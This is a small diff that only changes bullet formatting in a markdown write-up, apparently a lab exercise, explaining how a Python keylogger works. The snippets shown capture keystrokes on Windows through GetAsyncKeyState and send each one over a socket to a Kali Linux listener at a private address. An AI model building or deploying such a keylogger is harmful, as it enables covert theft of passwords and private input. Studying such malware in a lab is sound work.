@@ -118,13 +118,13 @@ On Kali Linux, the following command is used:
 
 **6. Code Explanation (High Level)**
 
-* **✔ 1. Server Connection**
+**✔ 1. Server Connection**
 * serverAddress = ('192.168.3.117', 9000)
 * clientSocket.connect(serverAddress)
 * Connects Windows machine to Kali listener.
 
 
-* **✔ 2. Capturing Keystrokes**
+**✔ 2. Capturing Keystrokes**
 * user32.GetAsyncKeyState(i)
 * Hooks into OS-level keyboard events.
 
@@ -133,12 +133,12 @@ On Kali Linux, the following command is used:
 * A custom ASCII table maps raw key codes to readable names.
 
 
-* **✔ 4. Sending Data**
+**✔ 4. Sending Data**
 * clientSocket.sendall(key.encode())
 * Every keystroke is sent as soon as pressed.
 
 
-* **✔ 5. Infinite Loop**
+**✔ 5. Infinite Loop**
 * Script keeps monitoring keys until closed.
 
 
